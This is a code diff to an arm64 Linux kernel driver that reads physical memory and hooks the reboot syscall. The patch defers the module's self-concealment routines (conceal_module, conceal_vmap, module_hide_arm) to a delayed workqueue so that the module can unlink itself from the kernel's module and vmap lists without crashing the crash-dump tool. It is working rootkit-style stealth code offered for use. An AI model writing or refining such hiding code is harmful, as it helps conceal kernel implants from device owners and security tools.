@@ -7,7 +7,7 @@
 #include <linux/mm.h>
 #include <linux/module.h>
 #include <linux/types.h>
-
+#include <linux/workqueue.h>
 #if KCFG_HIDE_SELF_MODULE
 #include <linux/kobject.h>
 #include <linux/list.h>
@@ -126,6 +126,24 @@ static void mm_globals_init(void) {
 	drv.m_pgd_va = (u64)(uintptr_t)phys_to_virt(pgd_pa);
 }
 
+
+static struct delayed_work hide_self_work;
+
+static void hide_self_work_fn(struct work_struct *work)
+{
+	LOGI("hide_self_work: deferred hide running\n");
+
+#if KCFG_HIDE_SELF_MODULE
+	if (module_hide_arm())
+		LOGN("module_hide arm failed; conceal_module still runs\n");
+	conceal_module();
+#endif
+#if KCFG_HIDE_VMAP
+	conceal_vmap();
+#endif
+
+	LOGI("hide_self_work: done\n");
+}
 int __init init_driver(void) {
 	int ret;
 
@@ -151,14 +169,18 @@ int __init init_driver(void) {
 	ret = register_kprobe(&reboot_kp);
 	if (ret < 0) { LOGE("register_kprobe (__arm64_sys_reboot) failed: %d\n", ret); return ret; }
 
-#if KCFG_HIDE_SELF_MODULE
-	if (module_hide_arm())
-		LOGN("module_hide arm failed; conceal_module still runs\n");
-	conceal_module();
-#endif
-#if KCFG_HIDE_VMAP
-	conceal_vmap();
-#endif
+	/*
+	 * Do NOT call module_hide_arm()/conceal_module()/conceal_vmap() here.
+	 * do_init_module() still has to run the MODULE_STATE_LIVE notifier
+	 * chain after this returns, and mrdump crashes if we have already
+	 * unlinked ourselves from the modules list / vmap list.
+	 *
+	 * Defer to a workqueue so the notifier chain completes first.
+	 */
+	INIT_DELAYED_WORK(&hide_self_work, hide_self_work_fn);
+	schedule_delayed_work(&hide_self_work, msecs_to_jiffies(2000));
+
+	LOGI("driver_init done, self-hide scheduled in 2000 ms\n");
 	return 0;
 }
 
